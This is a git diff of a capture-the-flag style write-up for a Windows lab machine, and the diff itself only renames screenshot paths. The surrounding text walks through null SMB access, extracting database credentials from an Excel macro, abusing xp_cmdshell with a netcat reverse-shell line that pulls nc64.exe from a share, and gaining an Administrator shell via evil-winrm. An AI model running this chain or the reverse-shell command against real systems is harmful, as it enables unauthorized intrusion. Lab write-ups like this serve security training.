@@ -12,7 +12,7 @@ Interesting that there was a MS-SQL instance publicly open.
 
 SMB allowed for null credentials to be accessed here:
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
 
 Within the Reports directory, I found a .xlsm file.
 
@@ -20,7 +20,7 @@ Within the Reports directory, I found a .xlsm file.
 
 We can download this Excel file back to our machine for analysis. Here, I used `oletools` to find out more about the file:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 We can see how there are VBA Macros within this file. Again, we can use `olevba` to extract the code.
 
@@ -28,11 +28,11 @@ We can see how there are VBA Macros within this file. Again, we can use `olevba`
 
 We found find this set of credentials for the database here.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then use `mssqlclient.py` to authenticate as this `reporting` user for the database that is publicly facing forward.
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
 
 ### xp\_cmdshell
 
@@ -52,8 +52,8 @@ xp_cmdshell "\\<IP>\share\nc64.exe -e cmd <IP> 4444"
 
 Now that we're in the machine, I ran winPEAS to enumerate possible escalation vectors. Funnily, it found the Administrator credentials in plaintext within the machine.
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
 
 Earlier, Nmap detected that port 5985 for WinRM was open. As such, we can use `evil-winrm` to gain a shell as the administrator.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
